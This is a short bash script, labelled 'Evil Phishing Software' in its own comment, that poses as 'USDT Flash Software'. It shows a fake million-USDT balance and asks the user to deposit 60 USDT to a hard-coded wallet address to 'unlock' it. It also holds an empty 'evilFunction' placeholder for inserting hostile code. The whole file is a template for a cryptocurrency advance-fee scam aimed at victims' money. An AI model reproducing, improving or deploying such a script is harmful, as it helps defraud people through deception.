#!/bin/bash

# Evil Phishing Software

balance=1000000
hash_id="TP4DgYdTSs7MmFmqoxREoH1zfaUSavX6ia"

usdt_logo="
\033[0;34m$$$$$$\
$$  __$$\
$$ /  \__| $$$$$$\  $$\   $$\  $$$$$$\$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\
\033[0;34m\$$$$$$\  $$  __$$\ $$ |  $$ |$$  _$$  _$$\  \____$$\ $$  __$$\ $$  __$$\
 \____$$\ $$ /  $$ |$$ |  $$ |$$ / $$ / $$ | $$$$$$$ |$$ /  $$ |$$ |  $$ |
$$\   $$ |$$ |  $$ |$$ |  $$ |$$ | $$ | $$ |$$  __$$ |$$ |  $$ |$$ |  $$ |
\033[0;34m\$$$$$$  |\$$$$$$  |\$$$$$$  |$$ | $$ | $$ |\$$$$$$$ |\$$$$$$  |$$ |  $$ |
 \______/  \______/  \______/ \__| \__| \__| \_______| \______/ \__|  \__|
\033[0m"

function fancyBoxEcho {
    local message="$1"
    local length=${#message}
    local border=$(printf '=%.0s' $(seq 1 $((length + 4))))

    echo "$border"
    echo "| $message |"
    echo "$border"
}

welcome_message="Welcome to the USDT Flash Software! Unlock your balance and enjoy the power of Flash USDT!"

echo -e "$usdt_logo"

fancyBoxEcho "$welcome_message"

echo -e "To unlock your balance of $balance USDT, please deposit 60 USDT to the following address: $hash_id"

function unlockBalance {
    read -p "Enter your deposit amount in USDT: " depositAmount
    read -p "Enter the transaction hash ID: " transactionHash

    if [[ $depositAmount -eq 60 && $transactionHash == "$hash_id" ]]; then
        echo "Congratulations! Your balance of $balance USDT has been unlocked."
        exit 0
    else
        echo "Error: Invalid deposit amount or transaction hash ID. Restarting..."
        sleep 2
        clear
        unlockBalance
    fi
}

function evilFunction {
    echo "Executing evil function..."
    # Insert your evil code here
    echo "Evil function executed successfully!"
}

fancyBoxEcho "Current Balance: $balance USDT"

while true; do
    unlockBalance
done
